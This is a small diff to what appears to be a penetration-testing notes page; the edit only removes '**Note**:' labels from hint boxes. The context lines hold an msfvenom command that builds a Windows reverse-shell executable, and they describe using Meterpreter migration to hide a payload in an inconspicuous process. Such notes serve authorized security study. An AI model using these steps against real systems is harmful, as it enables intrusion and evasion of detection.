@@ -84,7 +84,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f exe -o fil
 ```
 
 {{< hint style=notes >}}
-**Note**: To handle a staged payload don't use netcat. Use Metasploit’s `multi/handler` instead.
+To handle a staged payload don't use netcat. Use Metasploit’s `multi/handler` instead.
 {{< /hint >}}
 
 ---
@@ -100,7 +100,7 @@ When a host is compromised, the Meterpreter payload runs inside the process used
 To avoid this, we can use `migrate` to move the payload to a more stable or inconspicuous process.
 
 {{< hint style=notes >}}
-**Note**: Migration is only allowed to processes with the same or lower integrity and privilege level.
+Migration is only allowed to processes with the same or lower integrity and privilege level.
 {{< /hint >}}
 
 ```sh
